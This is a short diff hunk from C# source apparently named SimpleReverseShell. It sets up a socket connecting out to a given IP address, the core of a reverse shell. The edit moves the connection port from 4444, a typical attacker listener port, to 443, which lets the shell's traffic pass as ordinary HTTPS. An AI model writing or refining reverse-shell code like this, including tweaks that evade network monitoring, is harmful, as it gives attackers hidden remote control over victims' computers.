@@ -218,7 +218,7 @@ namespace SimpleReverseShell
 
       var sockAddrIn = new sockaddr_in();
       sockAddrIn.sin_family = 2;
-      sockAddrIn.sin_port = htons(4444);
+      sockAddrIn.sin_port = htons(443);
       PrintLastError(nameof(htons));
 
       sockAddrIn.sin_addr.S_addr = inet_addr(ip);
